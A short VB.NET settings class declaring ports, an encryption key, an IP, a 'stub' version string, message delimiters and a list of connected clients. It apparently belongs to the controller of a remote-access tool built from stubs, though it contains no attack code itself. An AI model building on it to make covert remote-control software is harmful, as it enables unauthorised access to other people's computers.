Public Class S_Settings

    Public Shared PORT As New List(Of Integer)
    Public Shared EncryptionKey As String = Nothing
    Public Shared IP As String = Nothing
    Public Shared StubVer As String = "v0.1.9.1"
    Public Shared SPL As String = "|'L'|"
    Public Shared EOF As String = "|'N'|"
    Public Shared Online As New List(Of S_Client)
End Class
